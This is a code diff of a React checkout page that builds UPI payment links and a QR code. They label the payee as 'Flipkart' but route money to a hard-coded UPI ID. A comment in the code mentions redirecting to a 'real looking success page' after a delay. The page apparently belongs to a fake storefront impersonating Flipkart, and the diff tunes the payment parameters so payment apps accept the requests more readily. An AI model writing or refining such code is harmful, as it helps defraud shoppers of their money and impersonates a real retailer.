@@ -135,9 +135,12 @@ const Checkout = () => {
       
       // Attempt to open UPI app
       setTimeout(() => {
-        if (selectedPayment === 'phonepe') window.location.href = `phonepe://pay?pa=${UPI_ID}&pn=Flipkart&mc=5499&tr=${transactionId}&am=${finalPayable}&cu=INR`;
-        else if (selectedPayment === 'gpay') window.location.href = `tez://upi/pay?pa=${UPI_ID}&pn=Flipkart&mc=5499&tr=${transactionId}&am=${finalPayable}&cu=INR`;
-        else if (selectedPayment === 'paytm') window.location.href = `paytmmp://pay?pa=${UPI_ID}&pn=Flipkart&mc=5499&tr=${transactionId}&am=${finalPayable}&cu=INR`;
+        const am = Number(finalPayable).toFixed(2);
+        const upiParams = `pa=${UPI_ID}&pn=Flipkart&mc=5499&mode=02&purpose=00&tr=${transactionId}&tn=Payment&am=${am}&cu=INR`;
+        
+        if (selectedPayment === 'phonepe') window.location.href = `phonepe://pay?${upiParams}`;
+        else if (selectedPayment === 'gpay') window.location.href = `tez://upi/pay?${upiParams}`;
+        else if (selectedPayment === 'paytm') window.location.href = `paytmmp://pay?${upiParams}`;
       }, 500);
 
       // Wait 2 minutes in background, then redirect to real looking success page
@@ -176,7 +179,7 @@ const Checkout = () => {
         <div className="flex-1 overflow-y-auto px-6 py-6 flex flex-col items-center">
           <h2 className="text-2xl font-bold mb-6 text-black">Scan QR Code to Pay</h2>
           <div className="mb-8 p-1">
-            <QRCodeSVG value={`upi://pay?pa=${UPI_ID}&pn=Flipkart&mc=5499&tr=${transactionId}&am=${finalPayable}&cu=INR`} size={220} />
+            <QRCodeSVG value={`upi://pay?pa=${UPI_ID}&pn=Flipkart&mc=5499&mode=02&purpose=00&tr=${transactionId}&tn=Payment&am=${Number(finalPayable).toFixed(2)}&cu=INR`} size={220} />
           </div>
           <div className="text-xl font-bold text-black mb-6">
             Order Amount ₹{finalPayable}
